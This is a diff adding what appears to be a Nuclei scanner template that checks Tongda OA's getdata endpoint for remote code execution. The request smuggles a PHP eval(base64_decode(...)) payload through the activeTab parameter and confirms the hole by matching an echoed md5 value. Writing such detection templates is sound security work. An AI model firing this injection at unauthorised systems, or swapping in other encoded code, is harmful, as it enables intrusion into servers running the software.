@@ -1,0 +1,29 @@
+id: poc-yaml-tongda-oa-getdata-rce
+info:
+  name: Tongda OA getdata Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+
+variables:
+  v1: "{{rand_base(8)}}"
+  v2: "{{base64(concat('echo md5(', v1, ')'))}}"
+
+http:
+  - method: GET
+    path:
+      - "/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22{{v2}}%22)))%3B/*&id=19&module=Carouselimage"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{v1}}"
+      - type: word
+        part: body
+        negative: true
+        words:
+          - "<"
